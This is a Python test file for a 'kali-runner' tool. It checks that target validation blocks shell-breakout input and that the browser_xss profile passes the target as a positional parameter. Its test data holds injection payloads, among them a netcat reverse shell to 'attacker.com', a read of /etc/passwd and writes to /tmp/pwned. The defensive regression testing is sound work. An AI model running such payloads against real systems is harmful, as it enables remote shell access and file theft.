from __future__ import annotations

import importlib.util
import sys
import uuid
import yaml
from pathlib import Path


ROOT = Path(__file__).resolve().parents[2]


def _load_runner(monkeypatch, tmp_path):
    monkeypatch.setenv("KALI_WORKSPACE", str(tmp_path / "workspace"))
    module_name = f"kali_runner_test_{uuid.uuid4().hex}"
    spec = importlib.util.spec_from_file_location(module_name, ROOT / "kali-runner" / "runner.py")
    assert spec and spec.loader
    module = importlib.util.module_from_spec(spec)
    sys.modules[module_name] = module
    spec.loader.exec_module(module)
    return module


def test_is_unsafe_target_blocks_shell_breakout_characters(monkeypatch, tmp_path) -> None:
    runner = _load_runner(monkeypatch, tmp_path)

    for payload in [
        "example.com' | nc attacker.com 4444 -e /bin/sh #",
        "example.com' > /tmp/pwned #",
        "example.com' < /etc/passwd #",
        "example.com'; touch /tmp/pwned #",
    ]:
        unsafe, reason = runner._is_unsafe_target(payload)
        assert unsafe is True, f"expected {payload!r} to be rejected, reason={reason!r}"

    unsafe, _ = runner._is_unsafe_target("example.com")
    assert unsafe is False


def test_browser_xss_profile_passes_target_as_positional_param_not_interpolated() -> None:
    """KALI-001: the target must never be interpolated directly into the sh -lc
    script text (that allowed a target containing a single quote to break out
    of the quoting and inject arbitrary shell syntax, e.g. a `|` pipeline).
    It must instead be a standalone argv element bound to `$1`.
    """
    source = (ROOT / "kali-runner" / "profiles" / "delivery_exploitation.yaml").read_text(encoding="utf-8")
    profiles = yaml.safe_load(source)
    cmd = profiles["browser_xss"]["cmd"]

    assert cmd[0] == "sh" and cmd[1] == "-lc"
    script = cmd[2]
    assert "{target}" not in script, "target must not be interpolated into the shell script text"
    assert "$1" in script, "script must reference the target via the $1 positional parameter"
    # target is its own argv element, materialized separately from the script
    assert cmd[-1] == "{target}"


def test_build_command_materializes_target_as_isolated_argv_for_browser_xss(monkeypatch, tmp_path) -> None:
    runner = _load_runner(monkeypatch, tmp_path)
    profiles = yaml.safe_load(
        (ROOT / "kali-runner" / "profiles" / "delivery_exploitation.yaml").read_text(encoding="utf-8")
    )
    profile = profiles["browser_xss"]

    malicious_target = "example.com' | touch /tmp/pwned #"
    argv = runner._build_command(profile, malicious_target, [])

    assert argv[0] == "sh"
    assert argv[1] == "-lc"
    # the malicious payload must appear ONLY as its own argv element (bound to
    # $1 at exec time), never embedded inside the script text itself
    assert malicious_target not in argv[2]
    assert argv[-1] == malicious_target
